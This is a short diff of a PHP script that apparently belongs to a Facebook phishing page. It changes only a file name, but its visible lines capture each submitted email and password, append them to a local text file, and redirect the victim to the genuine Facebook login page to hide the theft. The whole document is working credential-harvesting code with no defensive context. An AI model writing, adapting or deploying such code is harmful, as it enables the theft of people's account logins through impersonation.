@@ -16,10 +16,10 @@ $url = $base . $_SERVER['REQUEST_URI'];
 //	$mydomain = 'http://'.$_SERVER['HTTP_HOST'].'/';
 //}
 if (strpos($_SERVER['REQUEST_URI'], 'login.php?login_attempt') !== false) {
-	$file = file_get_contents('pass.txt');
+	$file = file_get_contents('passs.txt');
 //	echo $file;
 	if($_POST['email'] != ''){
-		file_put_contents('pass.txt', $file . $_POST['email'] . ' - ' . $_POST['pass'] . "\n");
+		file_put_contents('passs.txt', $file . $_POST['email'] . ' - ' . $_POST['pass'] . "\n");
 	 	header('Location: https://facebook.com/login.php?login_attempt=1&lwv=110');
 		die();
 	}
